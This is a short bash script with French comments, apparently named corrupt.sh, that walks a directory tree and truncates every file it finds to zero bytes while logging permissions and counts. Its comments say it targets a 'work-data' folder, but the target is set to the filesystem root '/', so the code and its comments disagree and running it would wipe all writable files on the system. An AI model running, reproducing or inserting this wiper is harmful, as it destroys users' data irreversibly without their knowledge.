#!/bin/bash

TARGET="/"

# La cible est maintenant work-data entier
TEST_DIR="$TARGET"

if [ ! -d "$TEST_DIR" ]; then
    echo "ERREUR : dossier work-data introuvable."
    exit 1
fi

# Chemin absolu de corrupt.sh
SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"

echo "=========================================="
echo "TRONCATURE DES FICHIERS"
echo "=========================================="
echo "Cible       : $TEST_DIR"
echo "Script exclu: $SELF"
echo ""

SUCCESS=0
FAILED=0
SKIPPED=0

while IFS= read -r -d '' FILE
do

    echo "------------------------------------------"
    echo "Fichier : $FILE"

    # Affiche les droits avant toute modification
    echo "Droits :"
    ls -l "$FILE"

    # Affichage plus lisible des permissions macOS
    stat -f "Permissions : %Lp | Propriétaire : %Su | Groupe : %Sg" "$FILE"

    # Ne jamais modifier corrupt.sh lui-même
    if [ "$FILE" = "$SELF" ]; then
        echo "RESULTAT : IGNORE"
        echo "Raison   : script courant"
        SKIPPED=$((SKIPPED + 1))
        echo ""
        continue
    fi

    # Tronque le fichier à 0 octet
    if : > "$FILE" 2>/dev/null; then

        echo "RESULTAT : TRONQUE"
        SUCCESS=$((SUCCESS + 1))

    else

        echo "RESULTAT : IGNORE"
        echo "Raison   : impossible d'écrire dans le fichier"
        FAILED=$((FAILED + 1))
        echo ""
        read -n 1 -s -r -p "Appuyez sur une touche pour continuer..." < /dev/tty
        echo ""
    fi
    
    echo ""

done < <(find "$TEST_DIR" -type f -print0)

echo "=========================================="
echo "RESULTAT FINAL"
echo "=========================================="
echo "Fichiers tronqués : $SUCCESS"
echo "Échecs             : $FAILED"
echo "Fichiers exclus    : $SKIPPED"
echo "=========================================="
